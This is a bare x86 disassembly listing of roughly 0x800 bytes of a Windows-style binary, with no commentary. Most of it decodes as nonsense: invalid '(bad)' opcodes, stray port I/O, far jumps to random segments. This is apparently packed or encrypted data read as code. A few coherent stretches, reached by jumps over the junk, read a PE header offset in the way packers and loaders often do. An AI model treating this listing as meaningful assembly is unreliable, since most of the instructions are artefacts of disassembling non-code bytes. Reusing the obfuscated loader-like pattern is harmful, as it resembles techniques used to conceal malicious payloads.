  40fe4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe4d:	out    0x94,al
  40fe4f:	pop    edx
  40fe50:	enter  0x50a,0xf8
  40fe54:	sub    al,0x6a
  40fe56:	pop    esi
  40fe57:	pushf  
  40fe58:	cmp    al,0xc3
  40fe5a:	int3   
  40fe5b:	frstor ds:0xc9f1f89
  40fe61:	pop    es
  40fe62:	iret   
  40fe63:	(bad)  
  40fe64:	imul   esp,ebp,0x2f
  40fe67:	outs   dx,BYTE PTR ds:[esi]
  40fe68:	and    BYTE PTR [ebx-0x24],ah
  40fe6b:	fld    TBYTE PTR [ebx]
  40fe6d:	lahf   
  40fe6e:	cmp    eax,0xedab6c4e
  40fe73:	repnz lahf 
  40fe75:	cmp    BYTE PTR [edi-0x5f],ah
  40fe78:	add    DWORD PTR [edi+0x23f6784],0xbcab345c
  40fe82:	mov    cl,al
  40fe84:	inc    ebx
  40fe85:	push   ebp
  40fe87:	gs xchg esi,eax
  40fe89:	in     eax,0xe5
  40fe8b:	pop    edi
  40fe8c:	out    dx,al
  40fe8d:	and    eax,DWORD PTR [edi]
  40fe8f:	xor    ch,al
  40fe91:	inc    esi
  40fe92:	adc    al,0xe9
  40fe94:	pushf  
  40fe95:	dec    DWORD PTR [edx+0x78]
  40fe98:	test   al,0xd3
  40fe9a:	test   ah,0xf6
  40fe9d:	dec    ecx
  40fe9e:	clc    
  40fe9f:	dec    ecx
  40fea0:	add    cl,BYTE PTR [edi+0x55a9102d]
  40fea6:	mov    esi,0x9aafbe70
  40feab:	test   eax,0xacf9a943
  40feb0:	dec    edi
  40feb1:	inc    ebx
  40feb2:	or     cl,BYTE PTR fs:[eax*8+0x6a33b53f]
  40feba:	jb     0x40fe76
  40febc:	jmp    0x40ff11
  40febe:	inc    ecx
  40febf:	fptan  
  40fec1:	mov    dh,0xfe
  40fec3:	iret   
  40fec4:	jmp    0x41d6:0xc5d24782
  40fecb:	cmp    eax,0xc4f83f97
  40fed0:	jge    0x40fed3
  40fed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fed3:	pop    ss
  40fed4:	cwde   
  40fed5:	rol    dl,cl
  40fed7:	push   cs
  40fed8:	arpl   WORD PTR [ebx+0x5d],ax
  40fedb:	cld    
  40fedc:	xchg   ebp,eax
  40fedd:	sub    ebp,DWORD PTR [edx]
  40fedf:	mov    ch,ch
  40fee1:	call   0x409c:0x306102f2
  40fee8:	test   eax,0xe4bd0059
  40feed:	shr    BYTE PTR [eax-0xd4b855e],cl
  40fef3:	push   es
  40fef4:	outs   dx,DWORD PTR ds:[esi]
  40fef5:	dec    ebx
  40fef6:	or     eax,0xdb9db411
  40fefb:	pop    ecx
  40fefc:	or     eax,0xf4081da7
  40ff01:	ficomp DWORD PTR [esi+0x31a907e6]
  40ff07:	ja     0x40fec4
  40ff09:	xor    eax,0xde3e6924
  40ff0e:	das    
  40ff0f:	jge    0x40fef4
  40ff11:	push   esp
  40ff12:	(bad)  
  40ff13:	call   0x81d38056
  40ff18:	dec    edx
  40ff19:	rol    DWORD PTR [ecx+0x7],1
  40ff1c:	test   BYTE PTR [ecx+0x20],al
  40ff1f:	pop    ebx
  40ff20:	and    DWORD PTR [eax+0x5343c3e7],ecx
  40ff26:	shr    DWORD PTR [ecx],cl
  40ff28:	lods   eax,DWORD PTR ds:[esi]
  40ff29:	dec    ebp
  40ff2a:	test   al,0x36
  40ff2c:	outs   dx,DWORD PTR ds:[esi]
  40ff2d:	inc    esp
  40ff2e:	fiadd  DWORD PTR ds:0x9193b5e
  40ff34:	add    al,0x2c
  40ff36:	pop    ebx
  40ff37:	loope  0x40ffb6
  40ff39:	(bad)  
  40ff3a:	jo     0x40ff81
  40ff3c:	pop    ds
  40ff3d:	dec    eax
  40ff3f:	(bad)  
  40ff40:	and    eax,0x9bc0c8e9
  40ff45:	iret   
  40ff46:	xchg   edi,eax
  40ff47:	pop    ebx
  40ff48:	mov    cl,0x51
  40ff4a:	pop    edx
  40ff4b:	pop    ebx
  40ff4c:	sbb    edx,0xab4a22de
  40ff52:	jb     0x40ff4e
  40ff54:	push   0xb5c21cef
  40ff59:	dec    eax
  40ff5a:	cmp    al,0xd3
  40ff5c:	mov    ds:0x54bec4bf,al
  40ff61:	or     edx,edx
  40ff63:	stos   DWORD PTR es:[edi],eax
  40ff64:	add    BYTE PTR ds:0xcb9741cc,dh
  40ff6a:	call   0x323d4536
  40ff6f:	test   DWORD PTR [eax+edi*8-0x75f7ba75],ebx
  40ff76:	add    bh,al
  40ff78:	add    eax,0x42e1b4
  40ff7d:	cmp    bh,BYTE PTR [edx]
  40ff7f:	add    BYTE PTR [eax],al
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e777,0x42fdfe
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fd51,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fdf6
  40ffaa:	and    edx,DWORD PTR ds:0x42e77b
  40ffb0:	mov    DWORD PTR ds:0x42fdf6,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e783,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	push   ss
  40ffdd:	into   
  40ffde:	fwait
  40ffdf:	in     eax,dx
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ff85
  40ffe9:	push   0x384fb2c8
  40ffee:	popa   
  40ffef:	sti    
  40fff0:	mov    edx,0x84465e73
  40fff5:	xchg   ecx,eax
  40fff6:	adc    dh,dh
  40fff8:	mov    ds:0x1c6b3252,al
  40fffd:	scas   eax,DWORD PTR es:[edi]
  40fffe:	in     al,0x72
  410000:	mov    al,ds:0x4ae234ec
  410005:	stos   DWORD PTR es:[edi],eax
  410006:	stos   BYTE PTR es:[edi],al
  410007:	cdq    
  410008:	dec    ecx
  410009:	mov    ds:0xfa4133e9,eax
  41000e:	jnp    0x410053
  410010:	fiadd  WORD PTR [edx-0x6b174789]
  410016:	add    ah,BYTE PTR [edi]
  410018:	mov    esi,0xb15b26c9
  41001d:	pop    ecx
  41001e:	pop    esi
  41001f:	fld    DWORD PTR ds:0x4a99dbcc
  410025:	jae    0x40ffcb
  410027:	out    dx,al
  410028:	dec    esp
  410029:	mov    cl,0xd5
  41002b:	cmp    al,0xc8
  41002d:	(bad)
  410030:	inc    ecx
  410031:	mov    ch,0x6b
  410033:	adc    al,0x89
  410035:	aaa    
  410036:	cdq    
  410037:	out    dx,al
  410038:	std    
  410039:	xchg   esp,eax
  41003a:	int3   
  41003b:	les    ecx,FWORD PTR [eax-0x74f36f9b]
  410041:	jg     0x40ffcc
  410043:	push   es
  410044:	xlat   BYTE PTR ds:[ebx]
  410045:	popa   
  410046:	fwait
  410047:	add    eax,0x8dd5531d
  41004c:	mov    al,ds:0xc0362f4a
  410051:	cli    
  410052:	je     0x4100c7
  410054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410055:	loope  0x41008c
  410057:	js     0x410093
  410059:	and    edi,DWORD PTR cs:[edi+eax*1+0x30]
  41005e:	test   BYTE PTR [ebx+ebp*8-0x3ab8164f],dl
  410065:	(bad)  
  410067:	xor    eax,0x64252e43
  41006c:	sti    
  41006d:	out    0x56,al
  41006f:	adc    eax,DWORD PTR [ecx+eax*4]
  410072:	add    ch,BYTE PTR [edx-0x28668cbe]
  410078:	jne    0x410051
  41007a:	and    cl,BYTE PTR [edx+0x4de4c013]
  410080:	jae    0x410064
  410082:	es call 0x8e44:0x9735fd80
  41008a:	pop    ds
  41008b:	push   esi
  41008c:	cld    
  41008d:	mov    bh,0x56
  41008f:	loop   0x4100ac
  410091:	jecxz  0x41002d
  410093:	add    BYTE PTR [ecx-0x66dbce0d],ah
  410099:	stos   DWORD PTR es:[edi],eax
  41009a:	stc    
  41009b:	out    0x80,al
  41009d:	fcom   st(2)
  41009f:	mov    ebp,0x96b61942
  4100a4:	mov    esp,0x4f3f1c94
  4100a9:	repz mov WORD PTR [edi-0x3a6c5d7b],ss
  4100b0:	shr    BYTE PTR [esi-0x5c],0x5d
  4100b4:	or     al,0x7
  4100b6:	add    eax,0xbd5a0670
  4100bb:	gs loopne 0x410101
  4100be:	adc    al,BYTE PTR [ebx]
  4100c0:	xor    al,0x86
  4100c2:	sub    eax,0x16d845f2
  4100c7:	xchg   ecx,eax
  4100c8:	shl    edi,cl
  4100ca:	hlt    
  4100cb:	mov    cl,0xd5
  4100cd:	(bad)  
  4100ce:	xchg   edx,eax
  4100cf:	in     al,dx
  4100d0:	enter  0xf482,0x7
  4100d4:	mov    esi,0xf52f48c5
  4100d9:	fucomp st(7)
  4100db:	ret    0x1194
  4100de:	cli    
  4100df:	pop    edx
  4100e0:	call   0xf9a52d8c
  4100e5:	inc    ecx
  4100e6:	mov    ebx,0x75b355d9
  4100eb:	test   DWORD PTR [ebx-0xb],edi
  4100ee:	xchg   esi,eax
  4100ef:	adc    bh,BYTE PTR fs:[edi]
  4100f2:	cmp    eax,0xe66a5a5b
  4100f7:	dec    esi
  4100f8:	repnz mov ecx,0xd61a1514
  4100fe:	clc    
  4100ff:	cwde   
  410100:	sub    eax,DWORD PTR [eax]
  410102:	xchg   ebx,eax
  410103:	retf   
  410104:	fstp   TBYTE PTR [ebx+eax*8]
  410107:	or     al,0x65
  410109:	lods   al,BYTE PTR ds:[esi]
  41010a:	sub    al,0xe0
  41010c:	lea    esp,[edx+0x54]
  41010f:	mov    bh,0xe6
  410111:	scas   eax,DWORD PTR es:[edi]
  410112:	push   es
  410113:	jb     0x4100df
  410115:	pop    ebx
  410116:	cmp    DWORD PTR [edx-0xe],ecx
  410119:	adc    cl,dh
  41011b:	clc    
  41011c:	int    0xc3
  41011e:	add    DWORD PTR [ecx+0x67],esi
  410121:	clc    
  410122:	cmp    BYTE PTR [edx-0x6a],0x9e
  410126:	lods   al,BYTE PTR ds:[esi]
  410127:	pop    ebp
  410128:	xchg   ebx,eax
  410129:	fcmovnbe st,st(1)
  41012b:	dec    eax
  41012c:	icebp  
  41012d:	cmp    al,0xaf
  41012f:	dec    esi
  410130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410131:	aas    
  410132:	push   edi
  410133:	pusha  
  410134:	or     eax,0x574c277b
  410139:	inc    eax
  41013a:	mov    dh,0x63
  41013c:	(bad)  
  41013d:	jmp    0x410148
  41013f:	in     al,dx
  410140:	fbld   TBYTE PTR [ebp+0x6a6b7615]
  410146:	fisttp WORD PTR [ebx+0x63]
  410149:	adc    al,0xd3
  41014b:	push   0x77
  41014d:	mov    ecx,0x1663ad4d
  410152:	xchg   ebx,eax
  410153:	lods   eax,DWORD PTR ds:[esi]
  410154:	(bad)  
  410155:	loope  0x410173
  410157:	fmul   QWORD PTR [esi+0x6c997d21]
  41015d:	push   esi
  41015e:	xor    ch,ch
  410160:	ds scas eax,DWORD PTR es:[edi]
  410162:	addr16 sub cl,ah
  410165:	outs   dx,DWORD PTR ds:[esi]
  410166:	mov    dh,0x27
  410168:	aad    0xd3
  41016a:	icebp  
  41016b:	xchg   edi,eax
  41016c:	repnz imul ebx,esi,0x6c26ba69
  410173:	ins    BYTE PTR es:[edi],dx
  410174:	stos   BYTE PTR es:[edi],al
  410175:	mov    al,BYTE PTR ds:0xab4b150a
  41017b:	fisub  WORD PTR [ebp-0x6b7bb25d]
  410181:	lds    ebp,FWORD PTR [ebx+0x6f16c501]
  410187:	popw   ds
  410189:	fstp   DWORD PTR [ebp+0x67]
  41018c:	ins    BYTE PTR es:[edi],dx
  41018d:	inc    eax
  41018e:	xor    ecx,DWORD PTR [edx]
  410190:	ret    
  410191:	lods   eax,DWORD PTR ds:[esi]
  410192:	dec    edi
  410193:	inc    esp
  410194:	imul   ebx,DWORD PTR ds:0xbd3f8424,0x7b80c968
  41019e:	sar    BYTE PTR [edx],0x21
  4101a1:	xor    dl,BYTE PTR [ebx]
  4101a3:	push   0x2d
  4101a5:	ret    
  4101a6:	repnz lea eax,[ebx+0x473ab70f]
  4101ad:	cmp    bh,dl
  4101af:	lods   eax,DWORD PTR ds:[esi]
  4101b0:	pop    ss
  4101b1:	mov    cl,0x21
  4101b3:	scas   al,BYTE PTR es:[edi]
  4101b4:	sar    ecx,1
  4101b6:	scas   eax,DWORD PTR es:[edi]
  4101b7:	loope  0x41019a
  4101b9:	sti    
  4101ba:	gs and dl,dl
  4101bd:	mov    ds:0xc2c44aa1,ax
  4101c3:	into   
  4101c4:	mov    esp,0xfd1f0b1
  4101c9:	xchg   BYTE PTR [esi],ah
  4101cb:	lds    ebx,FWORD PTR [edx]
  4101cd:	dec    eax
  4101ce:	mov    bh,0x22
  4101d0:	popf   
  4101d1:	outs   dx,BYTE PTR ds:[esi]
  4101d2:	fadd   DWORD PTR [esi-0x15901e6c]
  4101d8:	mov    dl,0xec
  4101da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101db:	int    0xe4
  4101dd:	(bad)  
  4101de:	xor    dh,dl
  4101e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101e1:	out    0x3e,eax
  4101e3:	push   ecx
  4101e4:	xchg   edx,eax
  4101e5:	rcl    DWORD PTR [ebx],1
  4101e7:	push   0x24
  4101e9:	mov    cl,0xfd
  4101eb:	pop    ecx
  4101ec:	xchg   edi,eax
  4101ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101ee:	inc    eax
  4101ef:	mov    eax,ds:0xf7a59d2f
  4101f4:	ror    BYTE PTR [ebx-0x8f5ef88],1
  4101fa:	sbb    al,BYTE PTR [ebp+ebx*2+0x4cd9b126]
  410201:	int3   
  410202:	xchg   ebp,eax
  410203:	adc    bl,BYTE PTR [ebp+0x1457e493]
  410209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41020a:	shl    BYTE PTR [eax-0xa],0xf6
  41020e:	push   edi
  41020f:	add    DWORD PTR [esi+0x1180589e],edi
  410215:	mov    BYTE PTR [edx-0x15],ch
  410218:	sub    eax,0xeedba514
  41021d:	pop    ebx
  41021e:	xlat   BYTE PTR ds:[ebx]
  41021f:	dec    esi
  410220:	cdq    
  410221:	push   0xb1b7d
  410226:	sbb    DWORD PTR [edx+ebp*1+0x695b5457],ecx
  41022d:	xchg   esi,eax
  41022e:	sub    esp,edi
  410230:	mov    bl,0x84
  410232:	scas   al,BYTE PTR es:[edi]
  410233:	ins    BYTE PTR es:[edi],dx
  410234:	bound  edi,QWORD PTR [edi+0x409af480]
  41023a:	out    dx,al
  41023b:	std    
  41023c:	lods   al,BYTE PTR cs:[esi]
  41023e:	pop    ss
  41023f:	cs popa 
  410241:	call   0x2860:0x4f3e9eb1
  410248:	shl    cl,cl
  41024a:	inc    edx
  41024b:	out    0x87,eax
  41024d:	cmp    ebp,DWORD PTR [edx+0x69dc70c1]
  410253:	daa    
  410254:	test   al,0x72
  410256:	sahf   
  410257:	or     al,0x53
  410259:	cs and eax,0x97db20e3
  41025f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410260:	dec    ecx
  410261:	hlt    
  410262:	pop    ss
  410263:	and    eax,0xc352d301
  410268:	sbb    bl,bh
  41026a:	bound  esp,QWORD PTR [eax+0x55]
  41026d:	outs   dx,BYTE PTR ds:[esi]
  41026e:	ja     0x41028d
  410270:	lock ins BYTE PTR es:[edi],dx
  410272:	sbb    BYTE PTR ss:[eax+edx*2+0x2890daf5],0x52
  41027b:	aaa    
  41027c:	imul   ebx,edi,0xffffffc9
  41027f:	arpl   WORD PTR [edi-0x1baa517],di
  410285:	push   ebp
  410286:	cwde   
  410287:	mov    ds:0xa6e3ea2d,eax
  41028c:	xchg   esi,eax
  41028d:	push   ebx
  41028e:	jp     0x410260
  410290:	dec    ebx
  410291:	ret    0x1606
  410294:	hlt    
  410295:	sar    BYTE PTR [ebp+0x11],cl
  410298:	pop    esp
  410299:	test   DWORD PTR [eax],esi
  41029b:	sub    al,0x26
  41029d:	jbe    0x4102e5
  41029f:	pop    esi
  4102a0:	fcmovnu st,st(5)
  4102a2:	xchg   ebx,eax
  4102a3:	pop    esi
  4102a4:	sbb    bl,dl
  4102a6:	or     BYTE PTR [esi+0x4fabcc0],bl
  4102ac:	mov    ah,0x95
  4102ae:	mov    al,0xf7
  4102b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b1:	cmc    
  4102b2:	sbb    eax,0xf17581cb
  4102b7:	stos   BYTE PTR es:[edi],al
  4102b8:	mov    al,0x3b
  4102ba:	rol    bl,0x22
  4102bd:	test   dl,0x59
  4102c0:	sbb    esi,0xffffffcb
  4102c3:	jne    0x4102d8
  4102c5:	or     dl,BYTE PTR [ebx]
  4102c7:	or     BYTE PTR ds:0x6f01f9aa,bh
  4102cd:	enter  0x4b62,0x1
  4102d1:	jmp    0xa9d4:0x3f3e7068
  4102d8:	mov    esp,0x46a27d79
  4102dd:	dec    eax
  4102de:	jg     0x4102ff
  4102e0:	icebp  
  4102e1:	test   DWORD PTR [edi-0x7b628256],edi
  4102e7:	dec    eax
  4102e8:	enter  0xa487,0xdc
  4102ec:	push   0xc097a10e
  4102f1:	xchg   ebp,eax
  4102f2:	rcr    edi,cl
  4102f4:	and    DWORD PTR [ecx],ebx
  4102f6:	(bad)  
  4102f7:	mov    edx,0x77d781e7
  4102fc:	dec    esp
  4102fd:	push   0xffffffa2
  4102ff:	sub    al,0x91
  410301:	iret   
  410302:	sbb    cl,cl
  410304:	pusha  
  410305:	xchg   ebp,eax
  410306:	mov    ch,0xc1
  410308:	jo     0x4102f5
  41030a:	sbb    eax,0xa2d05689
  41030f:	ret    0xcde3
  410312:	das    
  410313:	dec    esi
  410314:	sbb    al,dh
  410316:	out    dx,eax
  410317:	add    dl,BYTE PTR [ecx+esi*4-0xe]
  41031b:	icebp  
  41031c:	adc    bl,BYTE PTR [edx+0xf]
  41031f:	icebp  
  410320:	mov    eax,0xf59837da
  410325:	fsub   st,st(0)
  410327:	outs   dx,BYTE PTR ds:[esi]
  410328:	pop    esi
  410329:	inc    esi
  41032a:	push   ebp
  41032b:	push   cs
  41032c:	sbb    ah,BYTE PTR [ebp+0x6e]
  41032f:	mov    ebx,0x1081008
  410334:	dec    esp
  410335:	or     esi,DWORD PTR [esi+ecx*4-0x80]
  410339:	xor    eax,0xfc8fa915
  41033e:	enter  0x4723,0x60
  410342:	fs psrld mm2,mm3
  410346:	push   cs
  410347:	pop    esi
  410348:	pop    eax
  410349:	sbb    edi,DWORD PTR [ecx-0x60]
  41034c:	jae    0x4102ff
  41034e:	fldl2t 
  410350:	jp     0x410313
  410352:	ds sti 
  410354:	mov    ch,0x5f
  410356:	xchg   BYTE PTR [ebp+ecx*1-0x2c1b0365],cl
  41035d:	mov    ds:0x749e2193,eax
  410362:	addr16 xchg esp,eax
  410364:	test   al,0x9a
  410366:	push   0xffffffcd
  410368:	or     esp,eax
  41036a:	adc    esp,ecx
  41036c:	inc    edi
  41036d:	mov    BYTE PTR [ecx-0x2fd95bd],bh
  410373:	lea    ebp,[esi]
  410375:	shr    BYTE PTR [ecx],0xde
  410378:	out    0x8,al
  41037a:	push   esi
  41037b:	mov    ?,WORD PTR [edx]
  41037d:	into   
  41037e:	fs jae 0x410375
  410381:	xor    esp,eax
  410383:	(bad)  
  410384:	jmp    0x868fe96a
  410389:	ins    DWORD PTR es:[edi],dx
  41038a:	or     BYTE PTR [eax-0x40704153],dl
  410390:	(bad)  
  410391:	rcl    BYTE PTR [ecx-0x74],cl
  410394:	pop    es
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd85
  4103a6:	add    ecx,DWORD PTR ds:0x42fd89
  4103ac:	mov    DWORD PTR ds:0x42fd85,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e19c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x723b:0x3d3bbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	daa    
  4103db:	jno    0x410377
  4103dd:	adc    DWORD PTR [edx+0x5d241f0],ecx
  4103e3:	test   eax,0xdd9b8161
  4103e8:	and    esi,ebp
  4103ea:	test   eax,0xe861dbbc
  4103ef:	daa    
  4103f0:	pop    esi
  4103f1:	add    eax,0xeb5c79ce
  4103f6:	out    0xd8,al
  4103f8:	(bad)  
  4103f9:	es push ebp
  4103fb:	mov    cl,0xd3
  4103fd:	mov    esp,0x50246768
  410402:	mov    ecx,DWORD PTR [ebx+eiz*8+0x3df55d58]
  410409:	mov    esi,0xc5a7aed2
  41040e:	loope  0x4103a7
  410410:	aam    0x91
  410412:	mov    esp,0x882bcd48
  410417:	out    0x7c,al
  410419:	(bad)  
  41041a:	cwde   
  41041b:	or     edx,DWORD PTR [edi+0x55]
  41041e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41041f:	push   0x18
  410421:	or     ch,bh
  410423:	dec    eax
  410424:	mov    dh,0x74
  410426:	mov    cl,0x6
  410428:	mov    BYTE PTR [edx],ah
  41042a:	stc    
  41042b:	in     eax,0xcc
  41042d:	mov    ?,esp
  41042f:	lock in eax,dx
  410431:	nop
  410432:	iret   
  410433:	jbe    0x4103df
  410435:	shl    edi,cl
  410437:	mov    edi,0xb875c439
  41043c:	nop
  41043d:	inc    esi
  41043e:	shl    DWORD PTR [edx-0x285be152],0x6c
  410445:	push   es
  410446:	mov    dl,0x62
  410448:	call   0xcef:0x26d32d7d
  41044f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410450:	jecxz  0x4103fe
  410452:	jp     0x4103f7
  410454:	push   cs
  410455:	daa    
  410456:	in     al,dx
  410457:	sub    al,0xfa
  410459:	xlat   BYTE PTR ds:[ebx]
  41045a:	mov    eax,0x9b1c7f90
  41045f:	pop    esp
  410460:	adc    eax,0x9c56d86c
  410465:	cmp    eax,0x3739722c
  41046a:	pop    eax
  41046b:	neg    al
  41046d:	and    esp,DWORD PTR [ebx]
  41046f:	and    esi,DWORD PTR es:[eax+eiz*4+0x1b]
  410474:	(bad)  
  410475:	pop    edi
  410476:	push   ebp
  410477:	imul   DWORD PTR [ecx+ebp*1-0x3a]
  41047b:	dec    edi
  41047c:	dec    edx
  41047d:	xchg   esp,eax
  41047e:	icebp  
  41047f:	pop    ds
  410480:	loop   0x410425
  410482:	clc    
  410483:	push   edi
  410484:	stos   DWORD PTR es:[edi],eax
  410485:	jne    0x41043f
  410487:	inc    esi
  410488:	ins    DWORD PTR es:[edi],dx
  410489:	sbb    bl,0x3
  41048c:	push   0x2f
  41048e:	cs out dx,eax
  410490:	jmp    0xd032:0xaa32d204
  410497:	into   
  410498:	sub    al,0x88
  41049a:	xchg   ebp,eax
  41049b:	out    dx,al
  41049c:	ret    
  41049d:	and    ah,ch
  41049f:	fs data16 jmp 0x4104e4
  4104a3:	and    al,0xc1
  4104a5:	pop    es
  4104a6:	jl     0x4104c4
  4104a8:	cmp    eax,0xedd48d32
  4104ad:	cmp    ah,BYTE PTR [bp-0x165b]
  4104b2:	loopne 0x410484
  4104b4:	clc    
  4104b5:	add    DWORD PTR [edi],esp
  4104b7:	xchg   DWORD PTR [ecx+0x6962d03d],edx
  4104bd:	or     eax,0x4fe25fd8
  4104c2:	dec    edx
  4104c3:	fldcw  WORD PTR [edx-0x1b]
  4104c6:	add    al,dh
  4104c8:	jo     0x410525
  4104ca:	mov    ds:0xba3e8f6b,al
  4104cf:	lock xor al,0x72
  4104d2:	cmp    al,0x70
  4104d4:	mov    cl,0xc2
  4104d6:	loopne 0x4104ab
  4104d8:	popa   
  4104d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104da:	loopne 0x4104e0
  4104dc:	pop    esi
  4104dd:	mov    cl,cl
  4104df:	or     bl,BYTE PTR [ebx]
  4104e1:	idiv   ecx
  4104e3:	cwde   
  4104e4:	cli    
  4104e5:	fcom   QWORD PTR [edx+0x982a81e]
  4104eb:	mov    WORD PTR [eax-0x51],gs
  4104ee:	pop    edi
  4104ef:	jp     0x41056e
  4104f1:	dec    eax
  4104f2:	mov    eax,ss:0x5c57a548
  4104f8:	push   ebp
  4104f9:	jmp    0xffcd59d0
  4104fe:	jg     0x4104d6
  410500:	add    BYTE PTR [ebp-0x3cac4edc],bl
  410506:	add    DWORD PTR [edi+0x4877d935],edx
  41050c:	int    0xd1
  41050e:	and    al,0xfb
  410510:	fcom   st(3)
  410512:	sbb    al,0xf6
  410514:	int    0x1
  410516:	mov    esi,0x9f5543f2
  41051b:	inc    edx
  41051c:	add    al,0xe6
  41051e:	mov    bl,0x9c
  410520:	adc    eax,0xe17a88ff
  410525:	enter  0x86f1,0xb6
  410529:	mov    dl,0xc2
  41052b:	and    al,BYTE PTR [esi+edx*8]
  41052e:	ja     0x4104e0
  410530:	into   
  410531:	fs jle 0x410567
  410534:	popf   
  410535:	sbb    ch,ch
  410537:	aas    
  410538:	sbb    ebp,DWORD PTR [ecx+0x3c1669a6]
  41053e:	mov    dl,BYTE PTR [esi+esi*2+0x2d]
  410542:	mov    ebx,0x37a65a80
  410547:	mov    esi,DWORD PTR [eax]
  410549:	stos   DWORD PTR es:[edi],eax
  41054a:	xchg   esi,eax
  41054b:	or     eax,0x63089d8e
  410550:	jbe    0x41055c
  410552:	and    eax,0x6a8aa29e
  410557:	sti    
  410558:	in     al,0x4a
  41055a:	daa    
  41055b:	inc    edx
  41055c:	push   ecx
  41055d:	sbb    DWORD PTR [ecx+0x52],0x4e9248df
  410564:	inc    ebp
  410565:	push   0xffffffcb
  410567:	jbe    0x41051d
  410569:	popa   
  41056a:	sub    dh,BYTE PTR [esp+esi*8+0x3073fb1a]
  410571:	dec    edx
  410572:	push   eax
  410573:	aad    0x87
  410575:	cli    
  410576:	shr    dh,0x26
  410579:	pop    ds
  41057a:	or     eax,0xe26173cc
  41057f:	jle    0x41054d
  410581:	inc    esp
  410582:	push   ds
  410583:	push   edi
  410584:	mov    eax,0x19ca40de
  410589:	arpl   cx,sp
  41058b:	rcr    DWORD PTR [eax+edi*4],cl
  41058e:	sbb    ebx,DWORD PTR [eax-0x3d6f520e]
  410594:	cmp    eax,0xae98d615
  410599:	retf   0xdeca
  41059c:	mov    edx,edx
  41059e:	and    DWORD PTR [ecx+0x0],ecx
  4105a1:	dec    ebx
  4105a2:	dec    esp
  4105a3:	enter  0xb2dd,0x3e
  4105a7:	pop    ss
  4105a8:	shr    BYTE PTR [ebx-0x61e848a2],0x6b
  4105af:	mov    dl,0x79
  4105b1:	mov    ecx,0x14c957a9
  4105b6:	inc    ebx
  4105b7:	aad    0xf1
  4105b9:	mov    dl,0x93
  4105bb:	stos   DWORD PTR es:[edi],eax
  4105bc:	mov    BYTE PTR [edi],0xe0
  4105bf:	xor    BYTE PTR ds:0xdc7c5562,cl
  4105c5:	fisttp DWORD PTR [ebp-0x59]
  4105c8:	out    dx,al
  4105c9:	adc    ebx,DWORD PTR [ebx-0x6da9b7f1]
  4105cf:	in     eax,0x67
  4105d1:	sub    BYTE PTR [edi-0x6a],0x75
  4105d5:	rcr    BYTE PTR [edi+0x64],cl
  4105d8:	xchg   edi,eax
  4105d9:	in     al,dx
  4105da:	repnz daa 
  4105dc:	mov    ah,0xdf
  4105de:	scas   al,BYTE PTR es:[edi]
  4105df:	sahf   
  4105e0:	jle    0x4105c0
  4105e2:	add    eax,0xde94b88c
  4105e7:	pop    ebx
  4105e8:	push   cs
  4105e9:	pop    edx
  4105ea:	pop    ds
  4105eb:	ror    DWORD PTR [ebp-0x59],1
  4105ee:	inc    ecx
  4105ef:	fwait
  4105f0:	pop    edx
  4105f1:	push   ebx
  4105f2:	inc    ecx
  4105f3:	addps  xmm0,xmm3
  4105f6:	int3   
  4105f7:	cwde   
  4105f8:	aad    0x2f
  4105fa:	dec    esp
  4105fb:	loope  0x4105db
  4105fd:	jecxz  0x410675
  4105ff:	and    cl,ah
  410601:	mov    BYTE PTR [ebp+edx*8-0x53],al
  410605:	adc    eax,0x1116c8c0
  41060a:	add    eax,0x7185953b
  41060f:	fs sub cl,al
  410612:	mov    al,0x4b
  410614:	push   ss
  410615:	pop    esp
  410616:	cli    
  410617:	or     eax,0xa36da19a
  41061c:	or     al,dl
  41061e:	mov    esp,0xe812910b
  410623:	mov    ds:0x59dea0ad,al
  410628:	pop    ebp
  410629:	xchg   BYTE PTR [edx-0x5d],cl
  41062c:	aas    
  41062d:	retf   0xec8e
  410630:	xor    bl,0x51
  410633:	cmp    ch,BYTE PTR [esi-0x3e31f8f2]
  410639:	rcr    BYTE PTR [ebx+0x44e47836],0xf1
  410640:	add    eax,0x5d03d758
  410645:	sahf   
  410646:	or     bl,BYTE PTR [esi-0x79]
  410649:	fwait
  41064a:	icebp  
  41064b:	loope  0x41068e
  41064d:	jmp    0x410615
  41064f:	xchg   edx,eax
  410650:	pop    eax
